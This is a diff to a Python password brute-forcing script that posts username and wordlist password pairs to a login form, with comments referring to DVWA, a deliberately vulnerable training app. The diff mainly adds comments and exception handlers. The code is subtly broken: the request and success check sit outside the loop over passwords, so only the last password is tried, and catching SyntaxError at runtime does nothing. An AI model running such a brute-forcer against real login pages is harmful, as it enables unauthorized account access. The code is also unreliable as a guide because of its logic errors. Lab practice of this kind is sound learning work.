@@ -2,6 +2,7 @@ from termcolor import cprint
 import pyfiglet
 import requests
 from datetime import datetime
+import sys
 
 
 # Basic user interface header
@@ -32,13 +33,16 @@ cprint("_" * 50, 'blue')
 
 
 # Now the program will try all passwords in the password file
-
 try:
     for password in file.readlines():
         password = password.strip("\n")
 
+    # The program is using the input fields to try the username and password submitted by the user
     data = {'username':username, 'password':password, "Login":'submit'}
     send_data_url = requests.post(url, data=data, verify=False)
+    
+    # From here the program prints the status code, the url and the html of index.php
+    # An indication of successful login is if the html code shows h1; Welcome to DVWA
     cprint("HTTP status code: ", 'green')
     print(send_data_url.status_code)
     cprint("The URL: ", 'green')
@@ -46,10 +50,23 @@ try:
     cprint("The HTML: ", 'green')
     print(send_data_url.content)
    
+    # If the password is not correct, this code will run
     if "Login failed" in str(send_data_url.content):
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
+        # If the password is correct, this code will run, and print the password with green text
         cprint("[*] Password found: %s " % password,'green')
         
-except:
+except TimeoutError:
+    # If none of the code above (from try to the if / else), this code will run
     cprint("There was an error, please try again..", 'red')
+    sys.exit()
+except SystemError:
+    cprint("There was a system error..", 'red')
+    sys.exit()
+except SyntaxError:
+    cprint("That is not the correct syntax...", 'red')
+    sys.exit()
+except KeyboardInterrupt:
+    cprint("The program was interrupted by the user...", 'red')
+    sys.exit()
